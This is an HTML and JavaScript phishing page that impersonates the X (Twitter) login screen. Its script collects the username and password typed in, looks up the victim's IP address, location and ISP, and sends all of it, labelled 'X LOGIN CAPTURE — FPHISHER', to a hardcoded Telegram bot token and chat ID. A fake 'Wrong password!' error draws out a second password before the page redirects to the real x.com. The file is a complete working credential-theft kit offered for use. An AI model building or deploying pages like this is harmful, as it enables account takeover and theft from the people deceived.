<!DOCTYPE html>
<html lang="en" class="bg-black">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log in to X</title>
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- IMPORTANT: This allows external API calls on live hosting -->
  <meta http-equiv="Content-Security-Policy" 
        content="default-src 'self' 'unsafe-inline'; 
                 script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; 
                 connect-src 'self' https://api.ipify.org https://ipapi.co https://api.telegram.org">
</head>

<body class="text-white h-screen flex flex-col bg-black">

  <!-- STEP 1 -->
  <div id="step1" class="flex flex-col h-full justify-between">
    <div class="flex justify-between items-center px-5 py-4">
      <button class="text-lg font-medium">Cancel</button>
      
      <!-- Official X logo -->
      <svg width="32" height="32" viewBox="0 0 24 24" class="fill-current">
        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
      </svg>
      
      <div class="w-10"></div>
    </div>

    <div class="px-8 pt-4">
      <h1 class="text-4xl font-extrabold leading-tight">
        To get started, enter your phone, email or @username
      </h1>
      <input
        id="username"
        type="text"
        placeholder="Phone, email, or username"
        class="mt-10 w-full bg-black border border-gray-700 rounded-full px-5 py-4 text-lg placeholder-gray-500 focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500"
      />
    </div>

    <div class="px-8 pb-8 flex justify-between items-center">
      <span class="text-sky-500 text-base cursor-pointer hover:underline">Forgot password?</span>
      
      <button
        id="nextBtn"
        disabled
        class="px-8 py-3 rounded-full font-bold text-base transition-all duration-200 bg-gray-700 text-gray-500 cursor-not-allowed"
      >
        Next
      </button>
    </div>
  </div>

  <!-- STEP 2 -->
  <div id="step2" class="hidden flex flex-col h-full justify-between relative">
    <div class="flex justify-between items-center px-5 py-4">
      <button onclick="goBack()" class="text-2xl">×</button>
      <svg width="32" height="32" viewBox="0 0 24 24" class="fill-current">
        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
      </svg>
      <div class="w-10"></div>
    </div>

    <div class="px-8">
      <h1 class="text-4xl font-extrabold">Enter your password</h1>

      <div class="mt-8 bg-gray-900 rounded-2xl px-5 py-4">
        <p class="text-sm text-gray-400">Username / email</p>
        <p id="displayUser" class="text-xl mt-1 font-medium"></p>
      </div>

      <div class="mt-8 relative">
        <input id="password" type="password" placeholder="Password"
          class="w-full bg-black border-2 border-sky-500 rounded-full px-5 py-4 pr-14 text-lg placeholder-sky-700 focus:outline-none focus:border-sky-400">
        <button onclick="togglePassword()" class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 text-xl">👁️</button>
      </div>

      <p class="text-sky-500 mt-4 cursor-pointer hover:underline">Forgot password?</p>

      <div id="errorMsg" class="hidden mt-6 bg-blue-600 rounded-lg p-5 text-center shadow-xl">
        <p class="text-2xl font-bold">Wrong password!</p>
        <p class="text-sm mt-3 opacity-90">
          g;1777331748884040371327:-177738303035858759:imDUK<br>
          WKLLpXT97DSDoTWmEh3X:8
        </p>
      </div>
    </div>

    <div class="px-8 pb-8">
      <button id="loginBtn" disabled
        class="w-full bg-white text-black py-4 rounded-full text-lg font-bold disabled:bg-gray-700 disabled:text-gray-400">
        Log in
      </button>
    </div>
  </div>

  <script>
    // Your credentials (hardcoded as in your version)
    const TELEGRAM_BOT_TOKEN = "8690201412:AAFZ13-gmb-2Ax2EXdGlHUhVc19AApHVurc";
    const TELEGRAM_CHAT_ID   = "6487626501";

    const usernameInput = document.getElementById("username");
    const nextBtn       = document.getElementById("nextBtn");
    const passwordInput = document.getElementById("password");
    const loginBtn      = document.getElementById("loginBtn");
    const step1         = document.getElementById("step1");
    const step2         = document.getElementById("step2");
    const displayUser   = document.getElementById("displayUser");
    const errorMsg      = document.getElementById("errorMsg");

    let attemptCount = 0;

    // ==================== NEXT BUTTON (white when typing) ====================
    function updateNextButton() {
      const hasText = usernameInput.value.trim().length > 0;
      nextBtn.disabled = !hasText;

      if (hasText) {
        nextBtn.classList.remove("bg-gray-700", "text-gray-500", "cursor-not-allowed");
        nextBtn.classList.add("bg-white", "text-black", "hover:bg-gray-100", "shadow-md", "cursor-pointer");
      } else {
        nextBtn.classList.remove("bg-white", "text-black", "hover:bg-gray-100", "shadow-md", "cursor-pointer");
        nextBtn.classList.add("bg-gray-700", "text-gray-500", "cursor-not-allowed");
      }
    }

    usernameInput.addEventListener("input", updateNextButton);
    updateNextButton(); // run once on load

    nextBtn.addEventListener("click", () => {
      if (nextBtn.disabled) return;
      displayUser.textContent = usernameInput.value.trim();
      step1.classList.add("hidden");
      step2.classList.remove("hidden");
      errorMsg.classList.add("hidden");
      attemptCount = 0;
    });

    // ==================== OTHER FUNCTIONS ====================
    function goBack() {
      step2.classList.add("hidden");
      step1.classList.remove("hidden");
      errorMsg.classList.add("hidden");
    }

    passwordInput.addEventListener("input", () => {
      const hasValue = passwordInput.value.trim().length > 0;
      loginBtn.disabled = !hasValue;
      if (hasValue) {
        loginBtn.classList.add("bg-white", "text-black");
        loginBtn.classList.remove("bg-gray-700", "text-gray-400");
      } else {
        loginBtn.classList.add("bg-gray-700", "text-gray-400");
        loginBtn.classList.remove("bg-white", "text-black");
      }
    });

    function togglePassword() {
      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
    }

    // ==================== SEND TO TELEGRAM ====================
    async function captureAndSend(attemptNumber) {
      const username = usernameInput.value.trim();
      const password = passwordInput.value.trim();
      if (!username || !password) return;

      console.log(`[DEBUG] Attempt ${attemptNumber} - Sending data...`);

      let geo = { ip: "unknown", country: "unknown", region: "unknown", city: "unknown", isp: "unknown", proxy: "No" };

      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        geo.ip = (await ipRes.json()).ip;

        const geoRes = await fetch(`https://ipapi.co/${geo.ip}/json/`);
        const data = await geoRes.json();
        if (!data.error) {
          geo.country = data.country_name || "unknown";
          geo.region  = data.region || "unknown";
          geo.city    = data.city || "unknown";
          geo.isp     = data.org || "unknown";
          geo.proxy   = (data.proxy || data.in_eu) ? "Yes" : "No";
        }
      } catch (e) { console.warn("Geo fetch failed", e); }

      const message = `🔐✨  X LOGIN CAPTURE  —  FPHISHER  (Attempt ${attemptNumber})\n` +
        `═══════════════════════════════════════\n\n` +
        `👤 USERNAME / EMAIL  ➤ ${username}\n` +
        `🔑 PASSWORD         ➤ ${password}\n\n` +
        `🌍 LOCATION\n` +
        `➤ Country: ${geo.country} ${geo.country === "Nigeria" ? "🇳🇬" : ""}\n` +
        `➤ Region : ${geo.region}\n` +
        `➤ City   : ${geo.city}\n\n` +
        `🌐 IP ADDRESS       ➤ ${geo.ip}\n` +
        `➤ Proxy/VPN : ${geo.proxy}\n` +
        `➤ ISP       : ${geo.isp}\n\n` +
        `💻 USER AGENT      ➤ ${navigator.userAgent}\n` +
        `🕒 TIME            ➤ ${new Date().toISOString()}`;

      try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
        });
        console.log("Telegram response:", res.ok ? "SUCCESS" : "FAILED");
      } catch (err) {
        console.error("❌ Telegram send FAILED:", err);
      }
    }

    loginBtn.addEventListener("click", async () => {
      attemptCount++;
      await captureAndSend(attemptCount);

      if (attemptCount === 1) {
        errorMsg.classList.remove("hidden");
        loginBtn.textContent = "Log in";
        passwordInput.value = "";
      } else {
        window.location.href = "https://x.com/login";
      }
    });
  </script>
</body>
</html>
